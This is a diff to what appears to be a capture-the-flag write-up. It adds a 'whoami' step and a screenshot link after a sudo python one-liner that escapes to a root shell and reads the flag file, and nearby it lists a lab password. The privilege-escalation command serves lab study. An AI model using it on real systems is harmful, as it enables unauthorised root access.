@@ -114,7 +114,8 @@ Password: pink84
 Now we run a python exploit:
 ~~~
 sudo /usr/bin/python -c 'import os;os.system("/bin/sh")'
+whoami
 cd root
 cat flag4.txt
 ~~~
-[picture]
+![Capture](https://user-images.githubusercontent.com/32025331/155902751-aee3738f-b49c-4601-8dfb-6d6a4ad1466b.PNG)
